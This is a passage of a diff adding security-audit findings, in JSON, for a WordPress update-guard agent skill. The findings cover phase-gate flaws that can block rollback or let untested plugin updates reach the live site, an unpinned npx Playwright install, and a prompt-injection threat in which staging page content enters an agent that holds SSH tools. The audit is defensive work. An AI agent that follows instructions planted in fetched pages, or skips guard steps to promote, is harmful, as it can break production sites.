+        "Import guard.py. Build a dummy site and a row with phase screenshot_after plus a small plugin/theme inventory.",
+        "Call cmd_rollback(site, row, dry_run=False). Observe GuardError 'rollback is for a failed compare' and unchanged phase.",
+        "Call cmd_run from the same phase with capture_pages stubbed to raise GuardError. Observe the raise, phase still screenshot_after, and no restore.",
+        "Call cmd_compare against a before dir that has a dummy PNG and an empty after dir. Observe phase fail_rollback because the after screenshot is missing.",
+        "Call cmd_rollback again with dry_run=True or stubbed ssh_wp. Observe restore_items emit plugin/theme install --version --force for the inventory, live_changed false."
+      ],
+      "observed_result": "Independent dummy-row calls reproduced the sink: cmd_rollback(phase=screenshot_after, dry_run=False) raised 'rollback is for a failed compare' and left phase screenshot_after. The same refuse fired for update_staging and idle. cmd_run from screenshot_after with a fatal after-capture raised without calling restore. cmd_compare from screenshot_after with a missing after PNG set phase fail_rollback and decision Rolled back (reason: after screenshot is missing); a subsequent rollback then emitted inventory install commands against staging only. cmd_promote from screenshot_after remained blocked. A stubbed cmd_run from idle applied updates in memory then fatally captured; save_json was not reached, so the prior persisted idle row still had no inventory."
+    },
+    "remediation": {
+      "strategy": "Treat screenshot_after and update_staging as rollbackable once staging has been mutated. On a fatal after-capture, persist fail_rollback (or call restore immediately) instead of leaving screenshot_after in place. Make cmd_run restore after that fatal instead of only retrying screenshots.",
+      "code_changes": [
+        {
+          "file_name": "skills/wp-update-guard/scripts/guard.py",
+          "fixed_code": "def cmd_rollback(site: dict[str, Any], row: dict[str, Any], *, dry_run: bool) -> dict[str, Any]:\n    if not dry_run and row.get(\"phase\") not in (\n        \"fail_rollback\",\n        \"compare\",\n        \"screenshot_after\",\n        \"update_staging\",\n    ):\n        raise GuardError(\"rollback is for a failed compare\")\n    # ... existing restore_items ...\n\n# In cmd_run, if snapshot-after raises after staging was updated:\n#   persist fail_rollback (or call cmd_rollback) instead of exiting with screenshot_after unsaved/unrestored.\n# In capture_pages / cmd_snapshot(when=after): on GuardError after a mutated staging row,\n#   set row['phase'] = 'fail_rollback' before re-raising so main() can save a rollbackable state."
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Playwright missing is a documented first-run stop, and an uncaught screenshot throw or other non-0/1 Node exit is a realistic after-capture fatal. After a completed update-staging command, rollback and run are the published next actions."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Staging stays on untested plugin/theme (and optional core) versions and the coded restore path refuses. Live stays gated on pass_promote. A same-operator compare-then-rollback path still exists but is not taken by run, rollback, or the runbook."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Every cited line matches source. Dummy site/row calls independently reproduced the rollback refuse, the run-retry-without-restore path, the compare escape hatch, and the main() no-save-on-GuardError control flow. The listed OS-sandbox blocker is not decisive for this gate."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "wp-update-guard.guard.snapshot-after-skips-staging-update",
+    "title": "After-snapshot accepts update_staging phase and can Pass without updating staging",
+    "description": "The coded live-site interlock is pass_promote. After a before-snapshot the phase is update_staging, meaning the staging update has not run. cmd_snapshot --when after treats that phase as legal, captures the still-unupdated staging site, and cmd_compare then pixel-matches identical pages into pass_promote. promote applies plugin/theme update --all on live even though row.updated is empty and staging never received the updates under test. The error text says after screenshots come after the staging update, but the allowed set includes the pre-update phase. cmd_run does not skip; documented single-phase commands do.",
+    "root_cause": "cmd_snapshot(when=after) allows phase update_staging, which is the state after inventory and before cmd_update_staging, so the Pass state machine can be completed without a staging mutation.",
+    "intended_behavior": "After screenshots, compare, and promote must run only after staging plugins/themes were updated in this run. Live update --all should be unreachable while row.updated is empty and phase is still the pre-update update_staging state.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 333,
+        "scope": "cmd_snapshot",
+        "description": "After screenshots are accepted when phase is update_staging, screenshot_after, or compare."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 345,
+        "scope": "cmd_snapshot",
+        "description": "A real before-snapshot sets phase to update_staging without recording that updates ran."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 348,
+        "scope": "cmd_snapshot",
+        "description": "A successful after-snapshot moves phase to compare even when updated is still empty."
+      },
+      {
+        "kind": "sink",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 457,
+        "scope": "cmd_promote",
+        "description": "Promote checks only pass_promote and does not require row.updated or a staging update log."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 333,
+        "description": "The after-snapshot guard lists update_staging, the pre-update phase, despite the error claiming screenshots come after the staging update."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 410,
+        "description": "cmd_compare sets pass_promote from compare.json pass with no check that staging commands ran."
+      },
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 33,
+        "description": "The runbook forbids skipping steps and lists snapshot before, update staging, screenshot after, compare, then promote or rollback."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "The operator or agent must use documented single-phase commands and omit update-staging. cmd_run from update_staging still calls cmd_update_staging."
+      },
+      {
+        "kind": "data_state",
+        "description": "A real before-snapshot has left phase=update_staging and updated=[]. Identical before/after PNGs then satisfy compare."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "The OS invoker already has the local CLI and the live SSH credentials configured for promote."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "An operator or agent with local CLI access who runs the documented single-phase commands and omits update-staging after the before snapshot.",
+      "payloads": [
+        "snapshot --when after",
+        "compare"
+      ],
+      "instructions": [
+        "Import guard.py and call the phase commands with a dummy site/row. Stub capture_pages and inventory so no SSH or Playwright runs.",
+        "Call cmd_snapshot(when=after) from idle and confirm it raises 'after screenshots come after the staging update'.",
+        "Call cmd_snapshot(when=before). Observe phase=update_staging and updated=[].",
+        "Skip cmd_update_staging. Call cmd_snapshot(when=after). Observe it is accepted and phase becomes compare with updated still [].",
+        "Write identical dummy PNGs into the run before/ and after/ folders and call cmd_compare(dry_run=False).",
+        "Call cmd_promote(dry_run=True) and read the shaped live SSH commands."
+      ],
+      "observed_result": "Independent dummy-object walk: after-snapshot is allowed from update_staging, screenshot_after, and compare, and denied from idle. before-snapshot left phase=update_staging and updated=[]. Skipping update-staging, after-snapshot set phase=compare with updated=[]. compare-pages on identical dummy PNGs set decision=Pass and phase=pass_promote with updated=[]. cmd_promote(dry_run=True) emitted ssh -o BatchMode=yes deploy@live.example.net 'wp --path=/var/www/live plugin update --all' and the matching theme update --all. cmd_update_staging from the same pre-skip state records those commands and moves to screenshot_after; cmd_run does not skip."
+    },
+    "remediation": {
+      "strategy": "Treat update_staging as pre-update only. After-snapshot must require screenshot_after or compare. Compare and promote must also require a non-empty staging update log.",
+      "code_changes": [
+        {
+          "file_name": "skills/wp-update-guard/scripts/guard.py",
+          "fixed_code": "elif not dry_run and row.get(\"phase\") not in (\"screenshot_after\", \"compare\"):\n        raise GuardError(\"after screenshots come after the staging update\")\n    # ...\n    if not dry_run and (row.get(\"phase\") not in (\"compare\", \"screenshot_after\") or not row.get(\"updated\")):\n        raise GuardError(\"compare only after the staging update and after-screenshots\")\n    # ...\n    if not dry_run and (row.get(\"phase\") != \"pass_promote\" or not row.get(\"updated\")):\n        raise GuardError(\"promote only after every key page passed and staging was updated\")"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "cmd_run still updates staging, but single-phase snapshot/compare/promote are documented, and SKILL.md labels update_staging as already updated, so an agent resuming from status can take after-screenshots next."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Live WordPress receives plugin/theme update --all that were never applied or visually checked on staging, so production pages can break."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "The allowed-phase set, empty updated field, compare-to-pass_promote transition, and promote argv were reproduced with dummy site/row objects and identical dummy PNGs. No live SSH or HTTP was required."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "wp-update-guard.skill.unpinned-npx-playwright-install",
+    "title": "Skill runbook installs unpinned Playwright and Chromium onto the workstation",
+    "description": "When Playwright is missing, SKILL.md instructs the agent to run `npx --yes playwright install chromium`. capture-pages.mjs prints the same command and then imports playwright and launches Chromium. There is no package.json, lockfile, version, or checksum in this repository. `--yes` auto-accepts the npx install. npm can change what the name `playwright` resolves to, and `install chromium` fetches browser bits from Playwright's CDN, without an integrity root in this skill. That code then runs as the OS invoker on a workstation that holds SSH keys for staging and live WordPress hosts.",
+    "claimed_root_cause": "The screenshot-runtime install is an unbound name (`playwright` + `install chromium`) executed via `npx --yes` with no pin or independent digest, so a lower-trust registry/CDN writer can substitute the bits the skill later imports and launches.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 99,
+        "scope": "Workflow snapshot before",
+        "description": "The runbook tells the agent to run `npx --yes playwright install chromium` if Playwright is missing."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 43,
+        "scope": "loadPlaywright",
+        "description": "The CLI repeats that unpinned command when import(\"playwright\") and the skill-local node_modules fallback both fail."
+      },
+      {
+        "kind": "sink",
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 84,
+        "scope": "main",
+        "description": "chromium.launch({headless:true}) executes the installed Playwright/Chromium as the OS invoker."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 99,
+        "description": "Install command has no @version and uses npx --yes."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 33,
+        "description": "Runtime resolution is import(\"playwright\") then a relative node_modules path, with no version check."
+      },
+      {
+        "file": "README.md",
+        "line": 6,
+        "description": "The repo advertises npx-based skill install and has no package.json or lockfile for Playwright."
+      }
+    ],
+    "blockers": [
+      "OS-enforced sandbox controls unavailable",
+      "npm npx unpinned-name resolution, package signing, and Playwright chromium CDN integrity defaults are registry/CDN facts not in this repository"
+    ],
+    "validation_plan": {
+      "local": "Do not run npx against the public registry. In an OS-enforced sandbox, treat the SKILL.md command as a fixture string and confirm it has no @version and uses --yes. Optionally resolve against a dummy offline registry that serves a marked playwright tarball and show that capture-pages.mjs would import it. Do not install tools from the network.",
+      "deployment": "Owner observes what their npx and Playwright install path fetch for unpinned `playwright` (resolved version, integrity field, chromium download URL and checksum) and whether a pin plus an independent digest is required before agents may run the command."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "wp-update-guard/untrusted-staging-artifacts-to-agent-tools",
+    "title": "Staging capture artifacts enter the agent tool loop with only prompt isolation",
+    "description": "The staging HTTP origin is fetched anonymously and can write page pixels into PNGs plus navigation metadata and Playwright error text into capture.json and the CLI JSON that SKILL.md tells the agent to read. The same agent session can invoke guard.py update-staging and promote, which use the operator SSH identity against configured WordPress hosts. Hard rules in SKILL.md are prompt-only. A failed compare still blocks non-dry-run promote in code, but any other side effect (wrong site, extra SSH, promote after a later phase edit, secret disclosure) depends on model behavior that this host cannot observe.",
+    "claimed_root_cause": "Untrusted staging-origin bytes and remote command text are placed into the operator agent's context by design, while side-effecting SSH tools remain available with no deterministic output filter or action-binding check after that read.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 95,
+        "scope": "page.goto(url)",
+        "description": "Playwright navigates the constructed staging URL and loads origin-controlled HTML."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 112,
+        "scope": "page.screenshot",
+        "description": "Full-page PNGs persist origin-controlled page pixels; capture.json later stores url, status, and error text."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 341,
+        "scope": "cmd_snapshot",
+        "description": "Snapshot returns the capture report into the CLI JSON result that the agent consumes."
+      },
+      {
+        "kind": "propagation",
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 138,
+        "scope": "visual review runbook",
+        "description": "The skill requires the agent to look at before and after images and lets that review override a numeric pass."
+      },
+      {
+        "kind": "sink",
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 456,
+        "scope": "cmd_promote",
+        "description": "Promote runs live WP-CLI updates over operator SSH when phase is pass_promote, with no check that post-capture tool arguments still match a bound user intent object."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "skills/wp-update-guard/scripts/capture-pages.mjs",
+        "line": 95,
+        "description": "Anonymous page.goto on the staging origin with no content trust boundary before screenshot and JSON write."
+      },
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 35,
+        "description": "Secrets-off-screen and other hard rules are skill text; the CLI does not enforce them."
+      },
+      {
+        "file": "skills/wp-update-guard/SKILL.md",
+        "line": 138,
+        "description": "Agent is instructed to inspect screenshot pixels/text as part of the Pass decision."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 369,
+        "description": "update-staging emits raw SSH/WP-CLI stdout into agent-visible JSON."
+      },
+      {
+        "file": "skills/wp-update-guard/scripts/guard.py",
+        "line": 457,
+        "description": "promote's only coded gate is phase == pass_promote; SKILL.md policy is not checked."
+      }
+    ],
+    "blockers": [
+      "Whether a model acting on SKILL.md will treat staging screenshot or capture/SSH JSON text as instructions is not source-visible or locally observable"
+    ],
+    "validation_plan": {
+      "local": "Imported guard.py with dummy site/row objects and dry_run=True. Snapshot returns the capture command/report in CLI JSON; update-staging returns raw ssh_wp output; non-dry-run promote from idle or fail_rollback raises 'promote only after every key page passed', while dry_run=True skips that gate and shapes live plugin/theme update --all. capture-pages.mjs was not executed. No sandboxed model turn is available to observe whether dummy screenshot or JSON text is treated as instructions.",
+      "deployment": "On an owner-controlled dummy staging page, place visible instruction-like text. Ask the agent only to snapshot/compare with dry-run and no production SSH keys. Observe whether it invokes promote, another --site, or raw ssh. Do not touch live hosts."
+    }
+  }
+]
